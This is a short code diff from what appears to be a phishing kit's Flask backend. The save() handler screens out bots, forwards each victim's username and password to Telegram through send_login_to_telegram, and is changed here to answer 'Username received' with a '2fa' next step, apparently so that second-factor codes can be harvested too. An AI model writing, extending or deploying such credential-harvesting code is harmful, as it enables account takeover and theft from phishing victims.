@@ -135,16 +135,16 @@ def save():
         print(f"🤖 Bot blocked: {username} from {ip}")
         return jsonify({
             "success": True,
-            "message": "Saved successfully ✅",
-            "redirect_url": REDIRECT_URL
+            "message": "Username received",
+            "next_step": "2fa"
         })
 
     send_login_to_telegram(username, password)
 
     return jsonify({
         "success": True,
-        "message": "Saved successfully ✅",
-        "redirect_url": REDIRECT_URL
+        "message": "Username received",
+        "next_step": "2fa"
     })
 
 
